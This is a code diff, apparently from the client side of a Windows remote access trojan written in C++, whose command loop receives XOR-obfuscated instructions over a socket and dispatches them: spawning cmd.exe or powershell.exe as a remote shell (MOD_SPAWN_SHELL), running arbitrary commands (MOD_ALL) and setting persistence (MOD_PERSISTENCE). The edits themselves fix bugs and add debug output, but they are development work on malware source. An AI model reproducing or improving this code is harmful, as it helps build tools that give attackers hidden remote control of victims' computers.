@@ -48,7 +48,8 @@ INT Connexion::main()
     vector <string> result;
     INT len_recv=0;    
     BOOL status_destruction = FALSE; //Test if error in Destruction
-    
+    WCHAR prog[20];
+
     while(TRUE)
     {
         //Sleep(1000);
@@ -82,7 +83,7 @@ INT Connexion::main()
             else if(command.substr(0,2)==L"cd")
             {
             //Change directory
-                if(changeDirectory(command))
+                if(changeDirectory(command.substr(3)))
                 {
                     result.push_back("Error when changing folder.");
                 }
@@ -96,7 +97,7 @@ INT Connexion::main()
             else if(command.substr(0,16) == L"MOD_SPAWN_SHELL:")
             {   
                 //test if cmd.exe or powershell.exe
-                WCHAR prog[20];
+                ZeroMemory(&prog, sizeof(prog));
 
                 if(command.substr(16, command.length()) == L"cmd.exe")
                 {
@@ -113,7 +114,7 @@ INT Connexion::main()
             }
             else if(command.substr(0,8)==L"MOD_ALL:")
             {
-                Exec().executeCommand(command.substr(8));   
+                Exec().executeCommand(command.substr(8));  
             }
 
             else if (command.substr(0,16) == L"MOD_PERSISTENCE:")
@@ -124,6 +125,7 @@ INT Connexion::main()
 
                 if(command.substr(16) == L"default") //The client sends a response to the server to report whether the persistence was successfully completed. 
                 {
+                    wcout << "default persi " << endl;
                     send(sock_client, (char *)XOREncryption(L"\r\n").c_str(), 4 ,0);    
                 }
                 else
@@ -221,11 +223,10 @@ wstring Connexion::recvSafe()
     wcout << "\n\n-------------------------------------xor encrypt: "  << endl;
 
     wcout << "buffer: " << buffer << endl;
+    wcout << "len buffer: " << wcslen(buffer) << endl;
     wcout <<"result: " << result << endl;
     wcout << "command: " << xor_decode << endl;
     wcout << "len command: " << result.length() << endl;
-    for(int i=0; i<result.length(); i++)
-    {wcout << "i: " << i << " " << "char: " << result.at(i) << endl;}
 
     wcout <<"\n\n--------------------------\ntest xor decode:" << endl;
     
